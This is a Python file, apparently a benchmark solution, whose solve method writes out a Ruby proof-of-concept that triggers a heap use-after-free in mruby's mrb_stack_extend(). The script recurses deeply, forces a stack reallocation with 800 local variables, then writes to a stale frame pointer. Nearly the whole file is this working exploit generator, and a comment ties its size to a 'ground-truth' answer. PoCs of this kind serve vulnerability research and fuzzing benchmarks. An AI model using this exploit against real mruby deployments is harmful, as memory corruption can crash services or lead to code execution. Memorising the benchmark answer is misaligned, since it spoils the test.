import textwrap

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a Heap Use After Free vulnerability in mruby.

        The vulnerability occurs in `mrb_stack_extend()` where pointers on the VM
        stack for older call frames are not adjusted after the stack is reallocated.
        This leaves them pointing to freed memory.

        The PoC triggers this by:
        1. Creating a deep call stack using recursion. This populates the VM with
           multiple callinfo (`ci`) structures, each with a pointer to its
           respective frame on the VM's data stack.
        2. At the deepest recursion level, triggering a stack extension by creating
           a large number of local variables. This forces a `realloc` of the data
           stack, freeing the old memory region.
        3. As the recursion unwinds, the code attempts to access a local variable
           from a previous stack frame. In the vulnerable version, the `ci` for this
           frame holds a stale pointer to the now-freed old stack, leading to a
           use-after-free. In the fixed version, all `ci` pointers are updated,
           and the program runs correctly.
        """
        
        # The recursion depth determines how many callinfo frames are on the stack.
        # A moderate depth is sufficient.
        recursion_depth = 50

        # The number of local variables to create at the deepest recursion level.
        # This needs to be large enough to trigger a stack extension. The initial
        # mruby stack size is 128 elements. Choosing 800 ensures an extension
        # will occur and produces a PoC size similar to the ground-truth.
        num_locals = 800

        # Generate the Ruby code for creating many local variables in a compact way
        # using parallel assignment, e.g., "v0,v1,... = 0,1,...".
        lhs = ",".join([f"v{i}" for i in range(num_locals)])
        rhs = ",".join([str(i) for i in range(num_locals)])
        stack_extender = f"{lhs} = {rhs}"

        # Construct the final Ruby script.
        # textwrap.dedent is used to remove common leading whitespace from the
        # multiline string literal for a clean output.
        poc_code = textwrap.dedent(f"""\
            def rec(n)
              # A local variable for this stack frame.
              x = n
              if n == 0
                # At the bottom, trigger the stack extension.
                {stack_extender}
                return 0
              else
                # Recurse deeper.
                rec(n - 1)
                # After returning, the ci->stack for this frame is stale.
                # Writing to 'x' causes a use-after-free write.
                x = 42
              end
            end

            # Start the recursive process.
            rec({recursion_depth})

            # This line should only be reached on the patched, non-vulnerable version.
            puts "DONE"
        """)

        return poc_code.encode('utf-8')
